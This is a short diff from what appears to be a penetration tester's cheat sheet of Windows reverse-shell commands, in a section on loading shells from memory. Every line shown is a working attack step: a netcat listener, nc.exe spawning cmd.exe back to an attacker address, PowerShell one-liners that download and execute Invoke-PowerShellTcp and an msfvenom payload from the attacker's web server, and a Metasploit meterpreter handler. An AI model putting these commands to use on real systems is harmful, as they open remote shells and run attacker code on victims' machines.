@@ -890,10 +890,11 @@ rlwrap nc -lvnp 5555
 C:\programdata\nc.exe $MYIP 5555 -e cmd.exe
 
 +---------- Shell From Memory ----------+
+rlwrap nc -lvnp 5555
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse $MYIP -Port 5555"
 
-rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o 0.ps1
+rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/0.ps1')"
 
 +---------- Potatos (SeImpersonatePrivilege) ----------+
